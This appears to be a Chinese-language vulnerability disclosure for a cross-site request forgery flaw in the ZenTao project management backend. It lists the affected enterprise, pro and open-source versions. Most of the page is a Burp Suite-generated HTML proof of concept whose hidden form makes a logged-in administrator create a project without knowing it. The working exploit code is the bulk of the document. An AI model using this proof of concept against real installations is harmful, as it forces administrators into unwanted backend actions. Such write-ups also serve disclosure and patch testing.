# 禅道后台存在跨站请求伪造攻击(CSRF)

说明：禅道项目管理软件是开源项目管理软件。其最新版（企业版<=5.0.rc1，专业版<=10.0.rc1,开源版<=15.0）存在跨站请求伪造攻击。用户可构造场景，引诱管理员在不知情的情况下进行后台操作.

## 1.poc

poc：
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://ip:8002/index.php?m=program&f=create" method="POST">
      <input type="hidden" name="parent" value="0" />
      <input type="hidden" name="name" value="1" />
      <input type="hidden" name="PM" value="admin" />
      <input type="hidden" name="budget" value="1" />
      <input type="hidden" name="budgetUnit" value="CNY" />
      <input type="hidden" name="begin" value="2021&#45;04&#45;21" />
      <input type="hidden" name="end" value="" />
      <input type="hidden" name="status" value="wait" />
      <input type="hidden" name="desc" value="1" />
      <input type="hidden" name="acl" value="private" />
      <input type="hidden" name="whitelist&#91;&#93;" value="" />
      <input type="hidden" name="whitelist&#91;&#93;" value="admin" />
      <input type="hidden" name="uid" value="607feb9b12a29" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>


```
![img](2.png)
管理员点击后可触发相应操作
